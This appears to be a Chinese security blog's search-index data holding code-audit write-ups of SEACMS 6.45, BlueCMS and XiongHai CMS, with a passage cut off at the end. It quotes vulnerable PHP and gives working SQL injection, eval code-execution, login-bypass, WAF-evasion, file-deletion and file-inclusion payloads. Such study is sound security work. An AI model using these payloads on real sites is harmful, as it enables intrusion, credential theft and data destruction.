$uid=$_SESSION['sea_user_id']; $uid = intval($uid); $hashstr=md5($cfg_dbpwd.$cfg_dbname.$cfg_dbuser);//构造session安全码 if(empty($uid) OR $_SESSION['hashstr'] !== $hashstr) { showMsg(\"请先登录\",\"login.php\"); exit(); } 后台的登录处理如下,无法利用数组进行绕过 function checkUser($username,$userpwd) { global $dsql; //只允许用户名和密码用0-9,a-z,A-Z,'@','_','.','-'这些字符 $this-\u003euserName = m_ereg_replace(\"[^0-9a-zA-Z_@!\\.-]\",'',$username); $this-\u003euserPwd = m_ereg_replace(\"[^0-9a-zA-Z_@!\\.-]\",'',$userpwd); $pwd = substr(md5($this-\u003euserPwd),5,20); $dsql-\u003eSetQuery(\"Select * From `sea_admin` where name like '\".$this-\u003euserName.\"' and state='1' limit 0,1\"); $dsql-\u003eExecute(); $row = $dsql-\u003eGetObject(); if(!isset($row-\u003epassword)) { return -1; } else if($pwd!=$row-\u003epassword) { return -2; } else { $loginip = GetIP(); $this-\u003euserID = $row-\u003eid; $this-\u003egroupid = $row-\u003egroupid; $this-\u003euserName = $row-\u003ename; $inquery = \"update `sea_admin` set loginip='$loginip',logintime='\".time().\"' where id='\".$row-\u003eid.\"'\"; $dsql-\u003eExecuteNoneQuery($inquery); return 1; } } ","date":"2022-03-12","objectID":"/seacms_6.45/:2:0","tags":null,"title":"SEACMS_6.45","uri":"/seacms_6.45/"},{"categories":["代码审计"],"content":"comment/api/index.php存在报错注入 if($page\u003c2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page\u003c2) { createTextFile($h,$jsoncachefile); } die($h); function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(\"\",\"\",$page,0,10,$type,$id); if($id\u003e0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(',',$rlist); if(!empty($x)) { $ret[1] = Readrlist($x,1,10000); } } $readData = FormatJson($ret); return $readData; } ... function Readrlist($ids,$page,$size) { global $dsql,$type; $rl=array(); $sql = \"SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC\"; $dsql-\u003esetQuery($sql); $dsql-\u003eExecute('commentrlist'); while($row=$dsql-\u003eGetArray('commentrlist')) { $rl[]=\"\\\"\".$row['id'].\"\\\":{\\\"uid\\\":\".$row['uid'].\",\\\"tmp\\\":\\\"\\\",\\\"nick\\\":\\\"\".$row['username'].\"\\\",\\\"face\\\":\\\"\\\",\\\"star\\\":\\\"\\\",\\\"anony\\\":\".(empty($row['username'])?1:0).\",\\\"from\\\":\\\"\".$row['username'].\"\\\",\\\"time\\\":\\\"\".$row['dtime'].\"\\\",\\\"reply\\\":\\\"\".$row['reply'].\"\\\",\\\"content\\\":\\\"\".$row['msg'].\"\\\",\\\"agree\\\":\".$row['agree'].\",\\\"aginst\\\":\".$row['anti'].\",\\\"pic\\\":\\\"\".$row['pic'].\"\\\",\\\"vote\\\":\\\"\".$row['vote'].\"\\\",\\\"allow\\\":\\\"\".(empty($row['anti'])?0:1).\"\\\",\\\"check\\\":\\\"\".$row['ischeck'].\"\\\"}\"; } $readrlist=join($rl,\",\"); return $readrlist; } 注意到Readrlist中的sql语句为$sql = \"SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC\";,$ids使用()进行闭合,可能会存在注入漏洞 在ReadData函数中$x = implode(',',$rlist);并调用Readrlist($x,1,10000),向$rlist传入一个含有恶意字符串的数组,通过implode进行拼接转换为字符串,即可在Readrlist中进行注入 使用$rlist需要满足前置条件即page\u003e=2和id\u003e0 if($page\u003c2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist $id $page来源于用户传入的参数,而这些参数在include/common.php完成注册,因此这里直接传参即可进行sql注入,但要注意360webscan存在过滤 \\\\\u003c.+javascript:window\\\\[.{1}\\\\\\\\x|\u003c.*=(\u0026#\\\\d+?;?)+?\u003e|\u003c.*(data|src)=data:text\\\\/html.*\u003e|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|\\\\b(group_)?concat[\\\\s\\\\/\\\\*]*?\\\\([^\\\\)]+?\\\\)|\\bcase[\\s\\/\\*]*?when[\\s\\/\\*]*?\\([^\\)]+?\\)|load_file\\s*?\\\\()|\u003c[a-z]+?\\\\b[^\u003e]*?\\\\bon([a-z]{4,})\\s*?=|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|\u003e|\u003c|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.*\\\\*\\\\/|\u003c\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(`|'|\\\").*?(`|'|\\\"))FROM(\\\\(.+\\\\)|\\\\s+?.+?|(`|'|\\\").*?(`|'|\\\"))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE) 过滤UPDATE用extractvalue替换,过滤(group_)?concat用concat_ws gid=1\u0026page=3\u0026rlist[]=extractvalue(1,concat_ws(0x7e,1,user(),database(),version())) ","date":"2022-03-12","objectID":"/seacms_6.45/:3:0","tags":null,"title":"SEACMS_6.45","uri":"/seacms_6.45/"},{"categories":["代码审计"],"content":"include/main.class.php存在eval代码执行 function buildregx($regstr,$regopt) { return '/'.str_replace('/','\\/',$regstr).'/'.$regopt; } function parseStrIf($strIf) { if (strpos($strIf, '=') === false) { return $strIf; } if ((strpos($strIf, '==') === false) \u0026\u0026 (strpos($strIf, '=') \u003e 0)) { $strIf = str_replace('=', '==', $strIf); } $strIfArr = explode('==', $strIf); return (empty($strIfArr[0]) ? 'NULL' : $strIfArr[0]) . \"==\" . (empty($strIfArr[1]) ? 'NULL' : $strIfArr[1]); } function parseIf($content) { if (strpos($content, '{if:') === false) { return $content; } else { $labelRule = buildregx(\"{if:(.*?)}(.*?){end if}\", \"is\"); $labelRule2 = \"{elseif\"; $labelRule3 = \"{else}\"; preg_match_all($labelRule, $content, $iar); $arlen = count($iar[0]); $elseIfFlag = false; for ($m = 0; $m \u003c $arlen; $m++) { $strIf = $iar[1][$m]; $strIf = $this-\u003eparseStrIf($strIf); $strThen = $iar[2][$m]; $strThen = $this-\u003eparseSubIf($strThen); if (strpos($strThen, $labelRule2) === false) { if (strpos($strThen, $labelRule3) \u003e= 0) { $elsearray = explode($labelRule3, $strThen); $strThen1 = $elsearray[0]; $strElse1 = $elsearray[1]; @eval(\"if(\" . $strIf . \"){\\$ifFlag=true;}else{\\$ifFlag=false;}\"); if ($ifFlag) { $content = str_replace($iar[0][$m], $strThen1, $content); } else { $content = str_replace($iar[0][$m], $strElse1, $content); } } else { @eval(\"if(\" . $strIf . \") { \\$ifFlag=true;} else{ \\$ifFlag=false;}\"); if ($ifFlag) $content = str_replace($iar[0][$m], $strThen, $content); else $content = str_replace($iar[0][$m], \"\", $content); } } else { $elseIfArray = explode($labelRule2, $strThen); $elseIfArrayLen = count($elseIfArray); $elseIfSubArray = explode($labelRule3, $elseIfArray[$elseIfArrayLen - 1]); $resultStr = $elseIfSubArray[1]; $elseIfArraystr0 = addslashes($elseIfArray[0]); @eval(\"if($strIf){\\$resultStr=\\\"$elseIfArraystr0\\\";}\"); for ($elseIfLen = 1; $elseIfLen \u003c $elseIfArrayLen; $elseIfLen++) { $strElseIf = getSubStrByFromAndEnd($elseIfArray[$elseIfLen], \":\", \"}\", \"\"); $strElseIf = $this-\u003eparseStrIf($strElseIf); $strElseIfThen = addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen], \"}\", \"\", \"start\")); @eval(\"if(\" . $strElseIf . \"){\\$resultStr=\\\"$strElseIfThen\\\";}\"); @eval(\"if(\" . $strElseIf . \"){\\$elseIfFlag=true;}else{\\$elseIfFlag=false;}\"); if ($elseIfFlag) { break; } } $strElseIf0 = getSubStrByFromAndEnd($elseIfSubArray[0], \":\", \"}\", \"\"); $strElseIfThen0 = addslashes(getSubStrByFromAndEnd($elseIfSubArray[0], \"}\", \"\", \"start\")); if (strpos($strElseIf0, '==') === false \u0026\u0026 strpos($strElseIf0, '=') \u003e 0) $strElseIf0 = str_replace('=', '==', $strElseIf0); @eval(\"if(\" . $strElseIf0 . \"){\\$resultStr=\\\"$strElseIfThen0\\\";\\$elseIfFlag=true;}\"); $content = str_replace($iar[0][$m], $resultStr, $content); } } return $content; } } 在parseIf中利用正则提取内容,然后把内容分拆后放到eval中从而达到代码执行的目的 搜索parseIf的引用,发现在search.php中会向模板中插入用户数据后传递给parseIf(其他的php没有这种行为,只会直接将模板读取然后传递给parseIf) 一开始我用的是searchword参数,但是传递进去后发现内容被修改,然后我换成order参数,发现这个参数只进行addslashes转义操作 将order参数利用str_replace替换到content后,content被传递到parseIf进行分拆并eval执行 最终payload searchtype=5\u0026order=\"}asdf{end if} {if:phpinfo()}asdf{end if} 一个师傅的分析文章 seacms 多个版本的代码执行漏洞总结 ","date":"2022-03-12","objectID":"/seacms_6.45/:4:0","tags":null,"title":"SEACMS_6.45","uri":"/seacms_6.45/"},{"categories":["代码审计"],"content":"admin/admin_collect_news.php存在注入(无视waf) 反引号注入,正则搜索规则`[$][A-Za-z0-9_]*` elseif($action==\"importok\") { $importrule = trim($importrule); if(empty($importrule)) { ShowMsg(\"规则内容为空！\",\"-1\"); exit(); } //对Base64格式的规则进行解码 if(m_ereg('^BASE64:',$importrule)) { if(!m_ereg(':END$',$importrule)) { ShowMsg('该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !','-1'); exit(); } $importrules = explode(':',$importrule); $importrule = $importrules[1]; $importrule = unserialize(base64_decode($importrule)) OR die('配置字符串有错误！'); //die(base64_decode($importrule)); } else { ShowMsg('该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !','-1'); exit(); } if(!is_array($importrule) || !is_array($importrule['config']) || !is_array($importrule['type'])) { ShowMsg('该规则不合法，无法导入!','-1'); exit(); } $data = $importrule['config']; unset($data['cid']); $data['cname'].=\"(导入时间:\".date(\"Y-m-d H:i:s\").\")\"; $data['cotype'] = '1'; $sql = si(\"sea_co_config\",$data,1); $dsql-\u003eExecuteNoneQuery($sql); $cid = $dsql-\u003eGetLastID(); if (!empty($importrule['type'])){ foreach ($importrule['type'] as $type){ unset($type['tid']); $type['cid'] = $cid; $type['addtime'] = time(); $type['cjtime'] = ''; $type['cotype'] = '1'; $data = $type; $sql = si(\"sea_co_type\",$data,1); $dsql-\u003eExecuteNoneQuery($sql); } } ShowMsg('成功导入规则!','admin_collect_news.php'); exit; } ... function si($table, $data, $needQs=false) { if (count($data)\u003e1) { $t1 = $t2 = array(); $i=0; foreach($data as $key=\u003e$value) { if($i!=0\u0026\u0026$i%2==0) { $t1[] = $key; $t2[] = $needQs?qs($value):\"'$value'\"; } $i+=1; } $sql = \"INSERT INTO `$table` (`\".implode(\"`,`\",$t1).\"`) VALUES(\".implode(\",\",$t2).\")\"; } else { $arr = array_keys($data); $feild = $arr[0]; $value = $data[$feild]; $value = $needQs?qs($value):\"'$value'\"; $sql = \"INSERT INTO `$table` (`$feild`) VALUES ($value)\"; } return $sql; } function qs($s) { return \"'\".addslashes($s).\"'\"; } $importrule = unserialize(base64_decode($importrule))对$importrule进行base64解码后进行反序列化(全局搜索了一下,除了php原生类之外好像没有别的利用点) 反序列化后要满足这个条件if(!is_array($importrule) || !is_array($importrule['config']) || !is_array($importrule['type'])) $data = $importrule['config']; unset($data['cid']); $data['cname'].=\"(导入时间:\".date(\"Y-m-d H:i:s\").\")\"; $data['cotype'] = '1'; $sql = si(\"sea_co_config\",$data,1); 对反序列化解析出的$importrule['config']进行一定的处理,处理后的$data被传入到si中,显然count($data)大于1,但要注意只有当$i%2==0时数据才会被拼接到sql语句中,因此在构造序列化数组时要注意添加垃圾数据进行填充 foreach($data as $key=\u003e$value) { if($i!=0\u0026\u0026$i%2==0) { $t1[] = $key; $t2[] = $needQs?qs($value):\"'$value'\"; } $i+=1; } $sql = \"INSERT INTO `$table` (`\".implode(\"`,`\",$t1).\"`) VALUES(\".implode(\",\",$t2).\")\"; 同时要注意sea_co_config的表属性,其中cname的长度限制为50 \u003c?php $importrule = array(); $importrule['config'] = array(); $importrule['config']['abc']='asdf'; $importrule['config']['123']='asdf'; $importrule['config']['cname`,`getlistnum`,`getconnum`,`cotype`) values ((select group_concat(username) from seacms.sea_member),10,100,1)#']='asdf'; $importrule['type'] = array(); var_dump(serialize($importrule)); var_dump(\"BASE64:\".base64_encode(serialize($importrule)).\":END\"); ","date":"2022-03-12","objectID":"/seacms_6.45/:5:0","tags":null,"title":"SEACMS_6.45","uri":"/seacms_6.45/"},{"categories":["代码审计"],"content":"admin/admin_template.php存在目录穿越/任意文件删除漏洞 \u003c?php require_once(dirname(__FILE__).\"/config.php\"); if(empty($action)) { $action = ''; } $dirTemplate=\"../templets\"; ... else { if(empty($path)) $path=$dirTemplate; else $path=strtolower($path); if(substr($path,0,11)!=$dirTemplate){ ShowMsg(\"只允许编辑templets目录！\",\"admin_template.php\"); exit; } $flist=getFolderList($path); include(sea_ADMIN.'/templets/admin_template.htm'); exit(); } 只要求满足substr($path,0,11)==$dirTemplate即前11个字符为../templets因此可以传入..进行目录穿越 ","date":"2022-03-12","objectID":"/seacms_6.45/:6:0","tags":null,"title":"SEACMS_6.45","uri":"/seacms_6.45/"},{"categories":["代码审计"],"content":"admin/admin_collect.php存在任意文件读取 全局搜索@file_get_contents发现有几个html模板里面有这个函数,因此查找哪个php文件调用了这几个模板 在目标站点URL处输入即可 ","date":"2022-03-12","objectID":"/seacms_6.45/:7:0","tags":null,"title":"SEACMS_6.45","uri":"/seacms_6.45/"},{"categories":["代码审计"],"content":"转义函数 对部分参数默认进行转义操作 common.inc.php if(!get_magic_quotes_gpc()) { $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST); } common.fun.php function deep_addslashes($str) { if(is_array($str)) { foreach($str as $key=\u003e$val) { $str[$key] = deep_addslashes($val); } } else { $str = addslashes($str); } return $str; } 没有对$_SERVER进行转义,可能在User-Agent存在SQL注入 ","date":"2022-03-11","objectID":"/bluecms/:1:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"ad_js.php存在SQL注入漏洞 define('IN_BLUE', true); require_once dirname(__FILE__) . '/include/common.inc.php'; $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; if(empty($ad_id)) { echo 'Error!'; exit(); } $ad = $db-\u003egetone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id); 尽管$ad_id进行了转义操作,但是在拼接sql语句时没有用引号将$ad_id进行包裹,因此产生了sql注入 但是getone没有将mysql的报错信息回显,不能进行报错注入 function getone($sql, $type=MYSQL_ASSOC){ $query = $this-\u003equery($sql,$this-\u003elinkid); $row = mysql_fetch_array($query, $type); return $row; } 利用echo \"\u003c!--\\r\\ndocument.write(\\\"\".$ad_content.\"\\\");\\r\\n--\u003e\\r\\n\";对$ad_content进行回显,从而进行联合查询注入 ad_js.php?ad_id=1 union select 1,2,3,4,5,6,@@version; ","date":"2022-03-11","objectID":"/bluecms/:2:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"comment.php存在sql注入漏洞 include/common.fun.php function getip() { if (getenv('HTTP_CLIENT_IP')) { $ip = getenv('HTTP_CLIENT_IP'); } elseif (getenv('HTTP_X_FORWARDED_FOR')) { $ip = getenv('HTTP_X_FORWARDED_FOR'); } elseif (getenv('HTTP_X_FORWARDED')) { $ip = getenv('HTTP_X_FORWARDED'); } elseif (getenv('HTTP_FORWARDED_FOR')) { $ip = getenv('HTTP_FORWARDED_FOR'); } elseif (getenv('HTTP_FORWARDED')) { $ip = getenv('HTTP_FORWARDED'); } else { $ip = $_SERVER['REMOTE_ADDR']; } return $ip; } 前面提到没有对$_SERVER进行转义,getip这个函数给了我们利用的点 引用查询 没有转义的情况,传入XFF头为123' 添加$_SERVER = deep_addslashes($_SERVER);转义后的情况,仍然传入XFF头为123' 利用这一点进行sql注入 在XFF头中传入123','0'),('','1','0','0','0',database(),'1646297924','123','0')# 构造出的sql语句为INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '1', '0', '0', '0', '123', '1646298189', '123','0'),('','1','0','0','0',database(),'1646297924','123','0')#', '1') 网页回显结果 数据库查询结果 ","date":"2022-03-11","objectID":"/bluecms/:3:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"guest_book.php存在sql注入漏洞 elseif ($act == 'send') { $user_id = $_SESSION['user_id'] ? $_SESSION['user_id'] : 0; $rid = intval($_POST['rid']); $content = !empty($_POST['content']) ? htmlspecialchars($_POST['content']) : ''; $content = nl2br($content); if(empty($content)) { showmsg('评论内容不能为空'); } $sql = \"INSERT INTO \" . table('guest_book') . \" (id, rid, user_id, add_time, ip, content) VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')\"; $db-\u003equery($sql); showmsg('恭喜您留言成功', 'guest_book.php?page_id='.$_POST['page_id']); } 在common.inc.php中,将$online_ip定义为getip() 这一个注入点的利用方式同上,在XFF头中传入123',database())# 网页回显结果 数据库查询结果 ","date":"2022-03-11","objectID":"/bluecms/:4:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"admin/ad.php存在SQL注入漏洞 elseif($act == 'edit') { $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; if(empty($ad_id)) { return false; } $ad = $db-\u003egetone(\"SELECT ad_id, ad_name, time_set, start_time, end_time, content, exp_content FROM \".table('ad').\" WHERE ad_id=\".$ad_id); template_assign( array( 'current_act', 'act', 'ad' ), array( '�༭���', $act, $ad ) ); $smarty-\u003edisplay('ad_info.htm'); } $ad_id仅经过trim,同时没有单引号闭合,admin目录下还有多个类似的注入点 ","date":"2022-03-11","objectID":"/bluecms/:5:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"user.php存在文件包含漏洞 elseif ($act == 'pay'){ include 'data/pay.cache.php'; $price = $_POST['price']; $id = $_POST['id']; $name = $_POST['name']; if (empty($_POST['pay'])) { showmsg('对不起，您没有选择支付方式'); } include 'include/payment/'.$_POST['pay'].\"/index.php\"; } 利用../进行目录遍历并结合00截断进行文件包含 ","date":"2022-03-11","objectID":"/bluecms/:6:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"user.php存在任意文件删除 //编辑个人资料 elseif($act == 'edit_user_info'){ $user_id = intval($_SESSION['user_id']); if(empty($user_id)){ return false; } $birthday = trim($_POST['birthday']); $sex = intval($_POST['sex']); $email = !empty($_POST['email']) ? trim($_POST['email']) : ''; $msn = !empty($_POST['msn']) ? trim($_POST['msn']) : ''; $qq = !empty($_POST['qq']) ? trim($_POST['qq']) : ''; $mobile_phone = !empty($_POST['mobile_phone']) ? trim($_POST['mobile_phone']) : ''; $office_phone = !empty($_POST['office_phone']) ? trim($_POST['office_phone']) : ''; $home_phone = !empty($_POST['home_phone']) ? trim($_POST['home_phone']) : ''; $address = !empty($_POST['address']) ? htmlspecialchars($_POST['address']) : ''; if (!empty($_POST['face_pic1'])){ if (strpos($_POST['face_pic1'], 'http://') != false \u0026\u0026 strpos($_POST['face_pic1'], 'https://') != false){ showmsg('只支持本站相对路径地址'); } else{ $face_pic = trim($_POST['face_pic1']); } }else{ if(file_exists(BLUE_ROOT.$_POST['face_pic3'])){ @unlink(BLUE_ROOT.$_POST['face_pic3']); } } //插入新图片 $db-\u003equery(\"DELETE FROM \".table('post_pic').\" WHERE post_id = \".$post_id); for($i=0;$i\u003c4;$i++){ if($_POST['pic'.$i] \u0026\u0026 file_exists(BLUE_ROOT.$_POST['pic'.$i])){ $sql = \"INSERT INTO \".table('post_pic').\" (pic_id, post_id, pic_path) VALUES ('', '$post_id', '\".$_POST['pic'.$i].\"')\"; $db-\u003equery($sql); } } //如果没有图片，则将信息缩略图设置为默认图片 if (file_exists(BLUE_ROOT.$_POST['lit_pic'])) { @unlink(BLUE_ROOT.$_POST['lit_pic']); } face_pic3和lit_pic均可以传入../进行目录遍历并删除某个文件 ","date":"2022-03-11","objectID":"/bluecms/:7:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"admin.php存在任意文件删除 elseif($act == 'del') { $file_name = !empty($_GET['file_name']) ? trim($_GET['file_name']) : ''; $file = BLUE_ROOT.DATA.\"backup/\".$file_name; if(!@unlink($file)) { showmsg('删除备份文件失败'); } else { showmsg('删除备份文件成功', 'database.php?act=restore'); } } $file_name传入../进行目录遍历并删除某个文件 ","date":"2022-03-11","objectID":"/bluecms/:8:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"admin/tpl_manage.php存在任意文件写入 elseif($act == 'do_edit'){ $tpl_name = !empty($_POST['tpl_name']) ? trim($_POST['tpl_name']) : ''; $tpl_content = !empty($_POST['tpl_content']) ? deep_stripslashes($_POST['tpl_content']) : ''; if(empty($tpl_name)){ return false; } $tpl = BLUE_ROOT.'templates/default/'.$tpl_name; if(!$handle = @fopen($tpl, 'wb')){ showmsg(\"打开目标模版文件 $tpl 失败\"); } if(fwrite($handle, $tpl_content) === false){ showmsg('写入目标 $tpl 失败'); } fclose($handle); showmsg('编辑模板成功', 'tpl_manage.php'); } 这里需要admin权限 ","date":"2022-03-11","objectID":"/bluecms/:9:0","tags":null,"title":"BlueCMS","uri":"/bluecms/"},{"categories":["代码审计"],"content":"index.php任意文件包含 \u003c?php //单一入口模式 error_reporting(0); //关闭错误显示 $file=addslashes($_GET['r']); //接收文件名 $action=$file==''?'index':$file; //判断为空或者等于index include('files/'.$action.'.php'); //载入相应文件 ?\u003e admin/index.php内容一样,同样存在任意文件包含 在网站根目录新建info.php写入phpinfo,传入r=../info即可对info.php进行包含 但是由于addslashes的存在以及php版本的限制,不能进行00截断绕过 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:1:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"admin/files/login.php存在SQL注入 \u003c?php ob_start(); require '../inc/conn.php'; $login = $_POST['login']; $user = $_POST['user']; $password = $_POST['password']; $checkbox = $_POST['checkbox']; if ($login \u003c\u003e \"\") { $query = \"SELECT * FROM manage WHERE user='$user'\"; $result = mysql_query($query) or die('SQL语句有误：' . mysql_error()); $users = mysql_fetch_array($result); if (!mysql_num_rows($result)) { echo \"\u003cScript language=JavaScript\u003ealert('抱歉，用户名或者密码错误。');history.back();\u003c/Script\u003e\"; exit; } else { $passwords = $users['password']; if (md5($password) \u003c\u003e $passwords) { echo \"\u003cScript language=JavaScript\u003ealert('抱歉，用户名或者密码错误。');history.back();\u003c/Script\u003e\"; exit; } //写入登录信息并记住30天 if ($checkbox == 1) { setcookie('user', $user, time() + 3600 * 24 * 30, '/'); } else { setcookie('user', $user, 0, '/'); } echo \"\u003cscript\u003ethis.location='?r=index'\u003c/script\u003e\"; exit; } exit; ob_end_flush(); } ?\u003e 注意到$user = $_POST['user'];和$query = \"SELECT * FROM manage WHERE user='$user'\"; user没有经过任何过滤就拼接到语句中 首先是可以使用报错注入读取用户名和密码 user传入' or updatexml(1,concat(0x7e,(select @@version),0x7e),1)#即可带出数据 user传入' or updatexml(1,concat(0x7e,(select group_concat(password) from manage),0x7e),1)#即可读出md5之后的密码 除了对md5进行反查外,还可以通过伪造password来进行登录,已知一共有8列 user传入' union select 1,2,3,4,5,6,7,8#,可以导致sql查询返回的结果为4,而验证密码手段为md5($password) \u003c\u003e $passwords,传入某个字符串的md5并将该字符串作为密码传入即可登录 asdf 912ec803b2ce49e4a541068d495ab570 user传入' union select 1,2,3,'912ec803b2ce49e4a541068d495ab570',5,6,7,8#,password传入asdf即可登录 注意右上方的用户名 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:2:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"inc/checklogin.php存在权限绕过漏洞 \u003c?php $user=$_COOKIE['user']; if ($user==\"\"){ header(\"Location: ?r=login\"); exit; } ?\u003e $_COOKIE['user']可以被用户控制,从而绕过权限检查,使用cms中的大部分功能 注意右上方的用户名 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:3:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"admin/files/editlink.php存在SQL注入 \u003c?php require '../inc/checklogin.php'; require '../inc/conn.php'; $linklistopen='class=\"open\"'; $id=$_GET['id']; $query = \"SELECT * FROM link WHERE id='$id'\"; $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error()); $link = mysql_fetch_array($resul); 单引号闭合即可,可以使用报错注入 admin/?r=editlink\u0026id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+ ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:4:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"admin/files/editcolumn.php存在SQL注入 \u003c?php require '../inc/checklogin.php'; require '../inc/conn.php'; $columnopen = 'class=\"open\"'; $id = $_GET['id']; $type = $_GET['type']; if ($type == 1) { $query = \"SELECT * FROM nav WHERE id='$id'\"; $resul = mysql_query($query) or die('SQL语句有误：' . mysql_error()); $nav = mysql_fetch_array($resul); } if ($type == 2) { $query = \"SELECT * FROM navclass WHERE id='$id'\"; $resul = mysql_query($query) or die('SQL语句有误：' . mysql_error()); $nav = mysql_fetch_array($resul); } $save = $_POST['save']; $name = $_POST['name']; $keywords = $_POST['keywords']; $description = $_POST['description']; $px = $_POST['px']; $xs = $_POST['xs']; if ($xs == \"\") { $xs = 1; } $tuijian = $_POST['tuijian']; if ($tuijian == \"\") { $$tuijian = 0; } $content = $_POST['content']; if ($save == 1) { if ($name == \"\") { echo \"\u003cscript\u003ealert('抱歉，栏目名称不能为空。');history.back()\u003c/script\u003e\"; exit; } if ($type == 1) { $query = \"UPDATE nav SET name='$name', keywords='$keywords', description='$description', xs='$xs', px='$px', content='$content', date=now() WHERE id='$id'\"; @mysql_query($query) or die('修改错误：' . mysql_error()); echo \"\u003cscript\u003ealert('亲爱的，一级栏目已经成功编辑。');location.href='?r=columnlist'\u003c/script\u003e\"; exit; } if ($type == 2) { $query = \"UPDATE navclass SET name='$name', keywords='$keywords', description='$description', xs='$xs', px='$px', tuijian='$tuijian', date=now() WHERE id='$id'\"; @mysql_query($query) or die('修改错误：' . mysql_error()); echo \"\u003cscript\u003ealert('亲爱的，二级栏目已经成功编辑。');location.href='?r=columnlist'\u003c/script\u003e\"; exit; } } ?\u003e 同上 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:5:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"admin/files/columnlist.php存在SQL注入 \u003c?php require '../inc/checklogin.php'; require '../inc/conn.php'; $columnlistopen = 'class=\"open\"'; $delete = $_GET['delete']; $delete2 = $_GET['delete2']; if ($delete \u003c\u003e \"\") { $query = \"DELETE FROM nav WHERE id='$delete'\"; $result = mysql_query($query) or die('SQL语句有误：' . mysql_error()); echo \"\u003cscript\u003ealert('亲，ID为\" . $delete . \"的栏目已经成功删除！');location.href='?r=columnlist'\u003c/script\u003e\"; exit; } if ($delete2 \u003c\u003e \"\") { $query = \"DELETE FROM navclass WHERE id='$delete2'\"; $result = mysql_query($query) or die('SQL语句有误：' . mysql_error()); echo \"\u003cscript\u003ealert('亲，ID为\" . $delete2 . \"的二级栏目已经成功删除！');location.href='?r=columnlist'\u003c/script\u003e\"; exit; } ?\u003e 单引号闭合即可,可以使用报错注入 admin/?r=columnlist\u0026delete=' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+ ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:6:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"admin/files/commentlist.php存在SQL注入 \u003c?php require '../inc/checklogin.php'; require '../inc/conn.php'; $hdopen = 'class=\"open\"'; $type = $_GET['type']; if ($type == 'comment') { $fhlink = \"?r=commentlist\u0026type=comment\"; $fhname = \"评论\"; $type = 1; $taojian = \"type=1 AND cid\u003c\u003e0\"; $biao = \"content\"; } if ($type == 'message') { $fhlink = \"?r=commentlist\u0026type=message\"; $fhname = \"留言\"; $type = 